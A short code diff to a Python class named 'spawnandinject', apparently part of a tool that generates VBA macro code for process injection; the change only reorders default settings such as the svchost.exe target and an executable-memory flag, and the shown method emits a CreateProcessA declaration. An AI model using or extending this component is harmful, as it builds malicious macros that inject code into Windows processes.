@@ -1,14 +1,12 @@
 class spawnandinject:
     def __init__(self, arguments):
+        self.memoryPermission = '&H20'
+        self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
         if 'perm' in arguments:
             if arguments['perm'] == 'rwx':
                 self.memoryPermission = '&H40'
-            else:
-                self.memoryPermission = '&H20'
         if 'target' in arguments:
             self.target = arguments['target'].replace('\\','\\\\')
-        else:
-            self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
 
     def imports(self) -> list[str]:
         return ['Private Declare PtrSafe Function CreateProcessA Lib "KERNEL32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFOA, lpProcessInformation As PROCESS_INFORMATION) As LongPtr',
